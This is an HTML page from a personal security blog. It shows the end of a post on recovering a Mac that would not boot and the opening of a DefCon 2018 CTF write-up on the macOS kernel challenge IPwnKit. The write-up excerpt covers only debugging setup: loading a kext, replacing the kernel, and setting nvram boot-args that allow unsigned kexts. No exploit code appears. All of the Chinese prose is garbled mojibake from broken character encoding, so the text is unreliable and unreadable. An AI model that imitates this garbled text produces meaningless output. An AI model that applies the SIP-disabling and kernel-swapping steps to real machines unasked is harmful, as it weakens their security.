<p>ä¸è¡Œã€‚ã€‚ã€‚<br>2.é‡ç½®PRAMï¼šå¼€æœºæŒ‰ä½<code>Control+Command</code>å¹¶ä¿æŒ3ç§’ï¼Œè¯•äº†ä¸è¡Œ<br>3.é‡ç½®NVRemï¼šå¼€æœºæŒ‰ä½<code>Option+Command+R+P</code>å¹¶ä¿æŒ30ç§’ï¼Œä¹Ÿä¸è¡Œ<br>4.å¼€æœº<code>Command+S</code>ï¼Œå‡ºç°å‘½ä»¤è¡Œæç¤ºç¬¦åè¾“å…¥ä»¥ä¸‹å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount -uw &#x2F; </span><br><span class="line">mv &#x2F;var&#x2F;db&#x2F;.AppleSetupDone &#x2F;var&#x2F;db&#x2F;.AppleSetupDone-old</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p>ä¾æ—§ä¸è¡Œ<br>5.å¼€æœºæŒ‰ä½<code>shift</code>ï¼Œè²Œä¼¼å®‰å…¨æ¨¡å¼ï¼Œè¿›å»æœ‰safarièƒ½è”ç½‘æŸ¥èµ„æ–™ï¼Œæ²¡ç”¨ã€‚ã€‚ã€‚<br>6.å¼€æœºæŒ‰ä½<code>D</code>ï¼Œç¡¬ä»¶è‡ªæ£€ï¼Œæ²¡æ£€æµ‹åˆ°å•¥é”™è¯¯ã€‚ã€‚<br>7.å¼€æœºæŒ‰ä½<code>command + R</code>é”®ï¼Œè¿›å…¥ç£ç›˜å·¥å…·ï¼Œæ€¥æ•‘ï¼Œç£ç›˜æ£€æµ‹æ­£å¸¸ï¼Œæ²¡æ¡ƒå­ç”¨ã€‚ã€‚ã€‚<br>8.æ²¡æ³•å¼€æœºå¯ä»¥å…ˆè¯•è¯•è¿™ä¸ªæ–¹æ³•<a href="https://support.apple.com/zh-cn/HT201295" target="_blank" rel="noopener">å¦‚ä½•é‡ç½®Macçš„SMC</a></p>
<p>æƒ³èµ·ä»¥å‰é—®è¿‡å®¢æœï¼Œæ²¡å¼€å¯ç£ç›˜åŠ å¯†çš„æƒ…å†µä¸‹æ˜¯èƒ½ç›´æ¥è¦†ç›–å®‰è£…ç³»ç»Ÿçš„ï¼Œä¸éœ€è¦æŠ¹é™¤ï¼Œæ•°æ®ä¸ä¼šä¸¢å¤±ã€‚å°±è¿™æ ·å‚»å‚»çš„èŠ±äº†ä¸€ä¸ªå¤šå°æ—¶å®‰è£…ç³»ç»Ÿï¼Œé‡å¯è¿‡åï¼Œè¿˜æ˜¯ä¸€æ ·çš„æƒ…å†µã€‚ã€‚ã€‚é†‰äº†ï¼Œè¿™åŠæ³•ä¹Ÿä¸çµäº†</p>
<p>æ²¡åŠæ³•ï¼Œç›´æ¥æŠ¹é™¤é‡è£…ï¼Œå…ˆè¿›æ¢å¤æ¨¡å¼æŠŠé‡è¦èµ„æ–™æå‡ºæ¥ï¼Œæ¯•ç«Ÿæ•°æ®æ— ä»·ã€‚åœ¨<code>ç£ç›˜å·¥å…·-&gt;æ–‡ä»¶-&gt;æ–°å»ºæ˜ åƒ-&gt;æ¥è‡ªæ–‡ä»¶å¤¹çš„æ˜ åƒ...</code>é€‰ä¸­éœ€è¦ä¿å­˜çš„æ–‡ä»¶å¤¹ï¼Œåç¼€å¡«dmgï¼Œå­˜å‚¨åˆ°Uç›˜æˆ–ç§»åŠ¨ç¡¬ç›˜ä¸Šã€‚</p>
<p>ä¸€ä¸ªå¤šå°æ—¶åã€‚ã€‚ã€‚ç»ˆäºè£…å¥½äº†ï¼Œä½†æ‰€æœ‰çš„ç¯å¢ƒéƒ½ä¸¢å¤±äº†ã€‚ã€‚ã€‚</p>
	
	</div>
  <a type="button" href="/2020/05/01/æŸæ¬¡å¼ºåˆ¶å…³æœºåå¼•å‘çš„è¡€æ¡ˆ/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2020/02/17/DefConCTF-Qualifier-2018-IPwnKitè§£é¢˜æ€è·¯/" title="ä¸€é“macOSå†…æ ¸é¢˜çš„è§£é¢˜æ€è·¯">DefConCTF Qualifier 2018 IPwnKitè§£é¢˜æ€è·¯</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2020-02-17  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<h1 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h1><p>é¢˜ç›®æè¿°<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101132633-1612101132849.png" alt="title"></p>
<p>defcon 2018èµ„æ ¼èµ›çš„åŸé¢˜ï¼Œé¢˜ç›®æ–‡ä»¶ç»™äº†ä¸€ä¸ªkext IOKitå†…æ ¸æ‰©å±•æ¨¡å—ä»¥åŠkerneläºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…ˆæŠŠç¯å¢ƒæ­èµ·æ¥ã€‚æœ¬åœ°ç¯å¢ƒæ˜¯macOS 10.14.6 Mojave (18G103)ï¼Œå®‰è£…KDK 10.14.2<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101155018-1612101155023.png" alt="title"></p>
<p>ä¸ºæ–¹ä¾¿è°ƒè¯•å…ˆå…³æ‰SIPï¼ŒIPwnKit.kextå¤åˆ¶åˆ°/System/Library/Extensions/ï¼Œç»™æƒé™ï¼ŒåŠ è½½</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo cp IPwnKit.kext &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;</span><br><span class="line">sudo chown -R root:wheel &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br><span class="line">sudo chmod -R 755 &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br><span class="line">sudo kextload &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢æˆmacOS 10.14.2çš„å†…æ ¸</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp &#x2F;Library&#x2F;Developer&#x2F;KDKs&#x2F;KDK\_10.14.2\_18C54.kdk&#x2F;System&#x2F;Library&#x2F;Kernels&#x2F;kernel.development &#x2F;System&#x2F;Library&#x2F;Kernels&#x2F;kernel</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®å¼•å¯¼å‚æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nvram boot-args&#x3D;&quot;debug&#x3D;0x141 kext-dev-mode&#x3D;1 kcsuffix&#x3D;development pmuflags&#x3D;1 -v&quot;</span><br><span class="line"></span><br><span class="line">sudo nvram boot-args&#x3D;&quot;debug&#x3D;0x144 kext-dev-mode&#x3D;1 kcsuffix&#x3D;development pmuflags&#x3D;1 -v&quot;</span><br></pre></td></tr></table></figure>

<p>1&gt;&gt;boot-argsï¼šç³»ç»Ÿçš„å¯åŠ¨å‚<br>2&gt;&gt;debug=0Ã—141ï¼Œè¡¨ç¤ºç³»ç»Ÿå¯ä»¥è¿›è¡Œè¿œç¨‹é“¾æ¥è°ƒè¯•<br>3&gt;&gt;kext-dev-mode=1å…è®¸åŠ è½½æœªç­¾åkext<br>4&gt;&gt;kcsuffix=development å…è®¸æˆ‘ä»¬å¯åŠ¨ç³»ç»Ÿï¼Œé€šè¿‡developmentï¼Œä¸ä¹‹å‰æˆ‘ä»¬copyåˆ°/Systems/Library/Kernelä¸‹çš„kernel.developmentå¯¹åº”ï¼Œå¦‚æœæˆ‘ä»¬ä¹‹å‰æ‹·è´çš„æ˜¯kernel.debugï¼Œé‚£ä¹ˆè¿™é‡Œå¡«kcsuffic=debug<br>5&gt;&gt;pmuflags=1å…³é—­å®šæ—¶å™¨<br>6&gt;&gt;-væ˜¾ç¤ºå†…æ ¸åŠ è½½ä¿¡æ¯.</p>
	

	</div>
  <a type="button" href="/2020/02/17/DefConCTF-Qualifier-2018-IPwnKitè§£é¢˜æ€è·¯/#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h1 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h1><p>é¢˜ç›®æè¿°<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101132633-1612101132849.png" alt="title"></p>
<p>defcon 2018èµ„æ ¼èµ›çš„åŸé¢˜ï¼Œé¢˜ç›®æ–‡ä»¶ç»™äº†ä¸€ä¸ªkext IOKitå†…æ ¸æ‰©å±•æ¨¡å—ä»¥åŠkerneläºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå…ˆæŠŠç¯å¢ƒæ­èµ·æ¥ã€‚æœ¬åœ°ç¯å¢ƒæ˜¯macOS 10.14.6 Mojave (18G103)ï¼Œå®‰è£…KDK 10.14.2<br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101155018-1612101155023.png" alt="title"></p>
<p>ä¸ºæ–¹ä¾¿è°ƒè¯•å…ˆå…³æ‰SIPï¼ŒIPwnKit.kextå¤åˆ¶åˆ°/System/Library/Extensions/ï¼Œç»™æƒé™ï¼ŒåŠ è½½</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo cp IPwnKit.kext &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;</span><br><span class="line">sudo chown -R root:wheel &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br><span class="line">sudo chmod -R 755 &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br><span class="line">sudo kextload &#x2F;System&#x2F;Library&#x2F;Extensions&#x2F;IPwnKit.kext</span><br></pre></td></tr></table></figure>

<p>æ›¿æ¢æˆmacOS 10.14.2çš„å†…æ ¸</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp &#x2F;Library&#x2F;Developer&#x2F;KDKs&#x2F;KDK\_10.14.2\_18C54.kdk&#x2F;System&#x2F;Library&#x2F;Kernels&#x2F;kernel.development &#x2F;System&#x2F;Library&#x2F;Kernels&#x2F;kernel</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®å¼•å¯¼å‚æ•°</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo nvram boot-args&#x3D;&quot;debug&#x3D;0x141 kext-dev-mode&#x3D;1 kcsuffix&#x3D;development pmuflags&#x3D;1 -v&quot;</span><br><span class="line"></span><br><span class="line">sudo nvram boot-args&#x3D;&quot;debug&#x3D;0x144 kext-dev-mode&#x3D;1 kcsuffix&#x3D;development pmuflags&#x3D;1 -v&quot;</span><br></pre></td></tr></table></figure>

<p>1&gt;&gt;boot-argsï¼šç³»ç»Ÿçš„å¯åŠ¨å‚<br>2&gt;&gt;debug=0Ã—141ï¼Œè¡¨ç¤ºç³»ç»Ÿå¯ä»¥è¿›è¡Œè¿œç¨‹é“¾æ¥è°ƒè¯•<br>3&gt;&gt;kext-dev-mode=1å…è®¸åŠ è½½æœªç­¾åkext<br>4&gt;&gt;kcsuffix=development å…è®¸æˆ‘ä»¬å¯åŠ¨ç³»ç»Ÿï¼Œé€šè¿‡developmentï¼Œä¸ä¹‹å‰æˆ‘ä»¬copyåˆ°/Systems/Library/Kernelä¸‹çš„kernel.developmentå¯¹åº”ï¼Œå¦‚æœæˆ‘ä»¬ä¹‹å‰æ‹·è´çš„æ˜¯kernel.debugï¼Œé‚£ä¹ˆè¿™é‡Œå¡«kcsuffic=debug<br>5&gt;&gt;pmuflags=1å…³é—­å®šæ—¶å™¨<br>6&gt;&gt;-væ˜¾ç¤ºå†…æ ¸åŠ è½½ä¿¡æ¯.</p>
	
	</div>
  <a type="button" href="/2020/02/17/DefConCTF-Qualifier-2018-IPwnKitè§£é¢˜æ€è·¯/#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/BIOS/">BIOS<span>1</span></a></li>
		
			<li><a href="/categories/Docs/">Docs<span>1</span></a></li>
		
			<li><a href="/categories/NBOS/">NBOS<span>2</span></a></li>
		
			<li><a href="/categories/SerenityOS/">SerenityOS<span>3</span></a></li>
		
			<li><a href="/categories/macOS/">macOS<span>1</span></a></li>
		
			<li><a href="/categories/musl-libc/">musl-libc<span>2</span></a></li>
		
		</ul>
	</div>

		
			
	<div class="widget">
		<h4>Tag Cloud</h4>
		<ul class="tag_box inline list-unstyled">		
		
			<li><a href="/tags/è§£é¢˜æ€è·¯/">è§£é¢˜æ€è·¯<span>8</span></a></li>
		
			<li><a href="/tags/ç¯å¢ƒé…ç½®/">ç¯å¢ƒé…ç½®<span>2</span></a></li>
		
		 
		</ul>
	</div>


		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2021/06/26/è§£å†³ç¬¬ä¸€ä¸ªUEFI-PWNâ€”â€”Accessing-the-Truthè§£é¢˜æ€è·¯/"  title="Pwn2Win CTF 2021 Accessing the Truthçš„è§£é¢˜æ€è·¯" ><i class="fa fa-file-o"></i>è§£å†³ç¬¬ä¸€ä¸ªUEFI PWNâ€”â€”Accessing th...</a>
      </li>
    
      <li>
        <a href="/2021/06/26/PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç»­ç¯‡ï¼šå†…æ ¸æ€PWN/"  title="DefCon Quals 2021 coooinbase-kernelçš„è§£é¢˜æ€è·¯" ><i class="fa fa-file-o"></i>PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç»­ç¯‡ï¼šå†…æ ¸æ€PWN</a>
      </li>
    
      <li>
        <a href="/2021/06/26/PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨/"  title="DefCon Quals 2021 coooinbaseçš„è§£é¢˜æ€è·¯" ><i class="fa fa-file-o"></i>PWNæ‰ä¸€æ¬¾å°å‹å¼€æºOSâ€”â€”ç”¨æˆ·æ€åˆ©ç”¨</a>
      </li>
    
      <li>
        <a href="/2021/06/26/å€ŸåŠ©DefCon-Quals-2021çš„moooslå­¦ä¹ musl-mallocngï¼ˆæ¼æ´åˆ©ç”¨ç¯‡ï¼‰/"  title="DefCon Quals 2021 moooslçš„è§£é¢˜æ€è·¯" ><i class="fa fa-file-o"></i>å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦...</a>
      </li>
    
      <li>
        <a href="/2021/05/31/å€ŸåŠ©DefCon-Quals-2021çš„moooslå­¦ä¹ musl-mallocngï¼ˆæºç å®¡è®¡ç¯‡ï¼‰/"  title="DefCon Quals 2021 moooslçš„è§£é¢˜æ€è·¯" ><i class="fa fa-file-o"></i>å€ŸåŠ©DefCon Quals 2021çš„moooslå­¦...</a>
      </li>
    
  </ul>
</div>

		
			
<div class="widget">
	<h4>Links</h4>
	<ul class="blogroll list-unstyled">
	
		<li><i class="fa fa-github"></i><a href="http://www.github.com/m0nshaw" title="My Github account." target="_blank"]);">My Github</a></li>
	
	</ul>
</div>


		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2021 m0nshaw's blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
